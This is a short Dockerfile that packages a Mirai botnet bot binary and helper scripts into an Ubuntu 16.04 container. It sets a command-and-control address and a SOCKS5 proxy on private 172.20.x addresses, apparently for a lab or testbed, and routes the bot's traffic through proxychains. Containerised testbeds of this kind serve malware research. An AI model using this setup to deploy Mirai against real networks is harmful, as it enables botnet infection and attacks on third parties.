FROM ubuntu:16.04
ADD bot /
ADD mirai.dbg /
ADD loop.sh /
ADD run.sh /
ADD sources.list /etc/apt/
RUN apt-get update \
	&& apt-get install -y dnsutils \
        && apt-get install -y proxychains4 \
	&& apt-get install -y curl \
	&& apt-get install -y proxychains \
        && apt-get install -y tcpdump \
	&& apt-get install -y net-tools
ENV CNC 172.20.0.15
ENV PROXY 172.20.0.14
#CMD CNC=`nslookup cnc | awk '/^Address: / { print $2 }'`
CMD head -n -2 /etc/proxychains.conf > temp.conf && mv /etc/proxychains.conf /etc/proxychains.conf.bak && mv temp.conf /etc/proxychains.conf && cat /etc/proxychains.conf &&\
    echo "socks5 $PROXY 9050" >> /etc/proxychains.conf && \
    ./loop.sh
#    /bot $CNC $IP $CNC 0
